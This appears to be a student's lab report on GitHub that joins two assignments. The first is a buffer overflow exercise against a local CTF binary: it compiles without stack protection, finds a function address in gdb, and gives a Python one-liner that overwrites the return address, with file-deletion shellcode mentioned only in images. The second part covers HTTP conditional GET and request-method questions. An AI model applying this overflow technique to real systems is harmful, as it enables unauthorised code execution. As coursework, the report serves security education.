![image](https://github.com/user-attachments/assets/05bcc2e7-3cef-4f89-b65e-b03013c4468c)# 20110370, Phùng Huy Hoàng
# Lab 2: Buffer overflow attack
## I.Topic
*Inject code to delete file: file_del.asm is given on github*
 And Conduct attack on ctf.c
- This is the function myfunc 
<img width="726" alt="" src="https://github.com/huyhoangph/labs2/blob/master/assets/img/topic1.png">

- This is the function main 
<img width="726" alt="" src="https://github.com/huyhoangph/labs2/blob/master/assets/img/topic2.png">

- This is file_del.asm which is intended to delete a file in the current directory
<img width="726" alt="" src="https://github.com/huyhoangph/labs2/blob/master/assets/img/topic3.png">

## II. Implementation steps
*Run command to compile file ctf.c*
- gcc -g ctf.c -o ctf.ou -fno-stack-protector  
<img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/huyhoangph/labs2/blob/master/assets/img/biendich.png">

*run gdb and execute the command info disassemble to know the location of the myfunc function*
- gdb ./ctf.ou
- disassemble myfunc
<img width="726" alt="" src="https://github.com/huyhoangph/labs2/blob/master/assets/img/Picture4.png">

->then we know the address of the myfunc function is 0x0804851b

*Then execute the following command to overflow the buffer and include the address of the myfunc function*
-  ./ctf.ou $(python -c "print('A' * 112 + '\x1b\x85\x04\x08')")
<img width="726" alt="" src="https://github.com/huyhoangph/labs2/blob/master/assets/img/Picture5.png">

- Buffer overflow performed successfully. The myfunc function was executed but because the flag.txt file was missing, it returned the message "flag1 is missing!". Therefore, we must create file flag1.txt to continue. Then run the command again to see if the "myfunc is reached" message appears
<img width="726" alt="" src="https://github.com/huyhoangph/labs2/blob/master/assets/img/Picture9.png">

-> As a result, the buffer overflow message occurs again



# Task 4.2: Http conditional GET/Response Interaction
- Information sniffed

<img width="726" alt="" src="https://github.com/quang-ute/myprojects/assets/57078914/5b008df9-130c-4501-90d9-fb09f9a89a35">

## 4.2.a
*Inspect the contents of the first HTTP GET request from your browser to the server. Do you see an 
“IF-MODIFIED-SINCE” line in the HTTP GET?*
- There is an "If-Modified-Since" line in the HTTP GET request

<span style="color:blue">This is a way for the browser to request that content be returned only if it has been modified since the specified time</span>
## 4.2.b
*What is the HTTP status code and phrase returned from the server in response to this second HTTP GET? Did the server explicitly return the contents of the file? Explain.*
- No content is sent back.

<span style="color:blue">In my opinion it shows that the content has not changed since the specified time, so the server does not need to send the content back to the browser.</span>
# Task 4.3: Examine Http request methods
## 4.3.a
- Information being sniffed

<img width="829" alt="Screenshot 2023-05-02 171034" src="https://github.com/quang-ute/myprojects/assets/57078914/07eb9d96-0ac2-4891-986a-29f2593fa3e3">

<span style="color:blue">From my perspective, it demonstrates different methods of sending form data to the server and how the server responds based on the request type. The resulting HTML pages provide insights into how the server processes and presents the submitted data back to the user.</span>
## 4.3.b
*Examine encrypt password authentication*

![Screenshot 2023-07-02 215333](https://github.com/quang-ute/myprojects/assets/57078914/6b9b0fe0-af40-4d56-a505-fcf5e055736e)

 
